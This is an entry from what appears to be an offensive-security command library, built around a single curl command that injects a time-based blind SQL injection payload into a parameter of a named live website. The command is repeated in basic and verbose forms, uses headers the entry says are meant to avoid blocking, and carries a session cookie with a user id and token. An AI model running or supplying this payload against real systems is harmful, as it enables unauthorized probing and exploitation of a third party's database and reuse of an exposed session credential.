---
id: cmd-sqli-sleep15-001
data: >-
  curl -X GET
  "https://www.intensedebate.com/changeReplaceOpt.php?opt=1&acctid=419523 AND
  SLEEP(15)" -H "Host: www.intensedebate.com" -H "User-Agent: Mozilla/5.0 (X11;
  Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0" -H "Accept: */*"
  -H "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" -H "Accept-Encoding:
  gzip, deflate" -H "Connection: close" -H "Referer:
  https://www.intensedebate.com/install-t" -H "Cookie: country_code=FR;
  login_pref=IDC; idcomments_userid=26745306;
  idcomments_token=2008983fa4c2434ecc83a8c2bec380d3%7C1607463572"
tags:
  - sqli
  - timing
type: command
output: HTTP response after ~15 second delay
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:04.951Z'
verified: false
validated: true
submitted: true
---
# sqli-sleep-15-change-replace-opt

## Command

```bash
curl -X GET "https://www.intensedebate.com/changeReplaceOpt.php?opt=1&acctid=419523 AND SLEEP(15)" -H "Host: www.intensedebate.com" -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0" -H "Accept: */*" -H "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" -H "Accept-Encoding: gzip, deflate" -H "Connection: close" -H "Referer: https://www.intensedebate.com/install-t" -H "Cookie: country_code=FR; login_pref=IDC; idcomments_userid=26745306; idcomments_token=2008983fa4c2434ecc83a8c2bec380d3%7C1607463572"
```

## Description

This curl command sends an HTTP GET request to inject a MySQL SLEEP(15) payload into the acctid parameter, confirming time-based blind SQLi by causing a 15-second response delay.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `opt=1` | Endpoint option flag | Yes |
| `acctid=419523 AND SLEEP(15)` | Valid ID concatenated with SQL payload | Yes |
| Headers (e.g., User-Agent, Cookie) | Mimic browser to avoid blocking | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://www.intensedebate.com/changeReplaceOpt.php?opt=1&acctid=419523 AND SLEEP(15)" [headers]
```

### Advanced Usage

Add `-v` for verbose timing: ```bash
curl -v -X GET "https://www.intensedebate.com/changeReplaceOpt.php?opt=1&acctid=419523 AND SLEEP(15)" [headers]
```

## Expected Output

A delayed HTTP response (approx. 15,414 ms) with status 200, no error, but timing indicates successful injection.

## Related

- [[commands/sqli-sleep-7-change-replace-opt]]
- [[procedures/Confirm-Time-Based-SQLi-with-SLEEP-15]]
